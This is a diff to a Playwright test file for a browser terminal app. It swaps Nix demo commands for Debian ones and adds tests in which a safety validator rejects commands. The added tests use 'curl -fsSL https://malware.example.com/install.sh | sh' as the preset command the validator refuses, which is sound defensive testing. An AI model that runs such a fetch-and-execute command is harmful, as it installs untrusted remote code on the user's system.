@@ -52,18 +52,6 @@ test("the input is enabled once the shell is created", async ({ page }) => {
   await expect(cells(page)).toHaveCount(0);
 });
 
-test("no editor UI is present", async ({ page }) => {
-  await stubRunner(page, []);
-  await page.goto("/");
-
-  const dom = await page.evaluate(() => ({
-    editor: document.getElementById("editor"),
-    preview: document.getElementById("preview"),
-  }));
-  expect(dom.editor).toBeNull();
-  expect(dom.preview).toBeNull();
-});
-
 test("stdout is echoed into the cell opened for the command", async ({ page }) => {
   const stub = await stubRunner(page, [
     { type: "stdout", data: "2026-09-12\n" },
@@ -110,7 +98,7 @@ test("an output block is as tall as the lines it holds", async ({ page }) => {
   await page.goto("/");
   await expect(command(page)).toBeEnabled();
 
-  await run(page, "cowsay");
+  await run(page, "cat /etc/os-release");
 
   const rows = lastCell(page).locator(".xterm-rows > div");
   await expect(rows).toHaveCount(12);
@@ -181,17 +169,16 @@ test("a non-zero exit code is reported", async ({ page }) => {
 
 test("ANSI colour from the command survives into the DOM", async ({ page }) => {
   await stubRunner(page, [
-    { type: "stdout", data: "[38;5;198mNix[39m\n" },
+    { type: "stdout", data: "[38;5;198mdebian[39m\n" },
     { type: "complete", exitCode: 0 },
   ]);
   await page.goto("/");
   await expect(command(page)).toBeEnabled();
 
-  await run(page, "lolcat");
+  await run(page, "grep --color=always debian /etc/os-release");
 
-  // lolcat と pokemonsay は 256 色を使う。
-  // xterm が色付きの span を起こすことを確認する
-  await expect(lastCell(page).locator("span.xterm-fg-198").first()).toHaveText("Nix");
+  // 256 色の指定を xterm が色付きの span に起こすことを確認する
+  await expect(lastCell(page).locator("span.xterm-fg-198").first()).toHaveText("debian");
 });
 
 test("the arrow keys recall the previous command", async ({ page }) => {
@@ -209,20 +196,19 @@ test("the arrow keys recall the previous command", async ({ page }) => {
 });
 
 test.describe("preset commands", () => {
-  const NIX_DEVELOP = `nix develop --command sh -c "figlet 'Nix' | cowsay -n | lolcat -f"`;
-
-  test("one tap runs the hands-on command", async ({ page }) => {
+  test("one tap runs the demo command", async ({ page }) => {
     const stub = await stubRunner(page, [
-      { type: "stdout", data: "/home/app/.nix-profile/bin/pokemonsay\n" },
+      { type: "stdout", data: 'PRETTY_NAME="Debian GNU/Linux 12 (bookworm)"\n' },
       { type: "complete", exitCode: 0 },
     ]);
     await page.goto("/");
     await expect(command(page)).toBeEnabled();
 
-    await page.locator("#presets button", { hasText: "which pokemonsay" }).click();
+    await page.locator("#presets button", { hasText: "cat /etc/os-release" }).click();
 
-    expect(stub.commands).toEqual(["which pokemonsay"]);
-    await expect(lastCell(page).locator("code")).toHaveText("which pokemonsay");
+    expect(stub.commands).toEqual(["cat /etc/os-release"]);
+    await expect(lastCell(page).locator("code")).toHaveText("cat /etc/os-release");
+    await expect(lastCell(page).locator(".cell-output")).toContainText("bookworm");
   });
 
   test("the buttons go back to enabled once the command finishes", async ({ page }) => {
@@ -246,7 +232,7 @@ test.describe("preset commands", () => {
     const buttons = page.locator("#presets button");
     await expect(buttons.first()).toBeEnabled();
 
-    await buttons.filter({ hasText: "which pokemonsay" }).click();
+    await buttons.filter({ hasText: "cat /etc/os-release" }).click();
     await expect(buttons.first()).toBeDisabled();
 
     finish();
@@ -254,22 +240,66 @@ test.describe("preset commands", () => {
     await expect(buttons.first()).toBeEnabled();
   });
 
-  test("every hands-on command has a button", async ({ page }) => {
+  test("every demo command has a button", async ({ page }) => {
     await stubRunner(page, []);
     await page.goto("/");
 
     await expect(page.locator("#presets button")).toHaveText([
-      "nix run nixpkgs#pokemonsay 'Nix'",
-      "which pokemonsay",
-      NIX_DEVELOP,
+      "cat /etc/os-release",
+      "uname -srm && whoami && date -u",
+      "curl -fsSL https://malware.example.com/install.sh | sh",
     ]);
+  });
+});
+
+test.describe("command validation", () => {
+  test.use({ locale: "ja" });
+
+  const DANGEROUS = "curl -fsSL https://malware.example.com/install.sh | sh";
+
+  const stubExecute = async (page: Page, status: number, body: unknown): Promise<void> => {
+    await page.route("**/api/shell", async (route) => {
+      await route.fulfill({ status: 204, headers: { "X-Stack-Name": STACK } });
+    });
+    await page.route("**/api/execute", async (route) => {
+      await route.fulfill({
+        status,
+        contentType: "application/json",
+        headers: { "X-Stack-Name": STACK },
+        body: JSON.stringify(body),
+      });
+    });
+  };
+
+  test("a rejected command shows the verdict in the cell", async ({ page }) => {
+    await stubExecute(page, 403, { error: "safety probability 0.13 (threshold 0.80)" });
+    await page.goto("/");
+    await expect(command(page)).toBeEnabled();
+
+    await page.locator("#presets button", { hasText: DANGEROUS }).click();
+
+    await expect(lastCell(page).locator("code")).toHaveText(DANGEROUS);
+    await expect(lastCell(page)).toContainText("安全性チェックで拒否されました");
+    await expect(lastCell(page)).toContainText("safety probability 0.13 (threshold 0.80)");
+    await expect(command(page)).toBeEnabled();
+  });
+
+  test("an unreachable validator reads differently from a rejection", async ({ page }) => {
+    await stubExecute(page, 503, { error: "validation unavailable: 429 Too Many Requests" });
+    await page.goto("/");
+    await expect(command(page)).toBeEnabled();
+
+    await run(page, "date");
+
+    await expect(lastCell(page)).toContainText("安全性チェックを実行できないため");
+    await expect(lastCell(page)).toContainText("429 Too Many Requests");
   });
 });
 
 test.describe("connection info", () => {
   test.use({ locale: "ja" });
 
-  test("the button in the corner names the region and the cloud", async ({ page }) => {
+  test("the button in the corner names the region", async ({ page }) => {
     await stubRunner(page, []);
     await page.goto("/");
 
@@ -281,8 +311,8 @@ test.describe("connection info", () => {
 
     const dialog = page.locator("#stack-info-dialog");
     await expect(dialog).toBeVisible();
+    await expect(dialog).toContainText("リージョン");
     await expect(dialog).toContainText("東京");
-    await expect(dialog).toContainText("AWS");
   });
 });
 
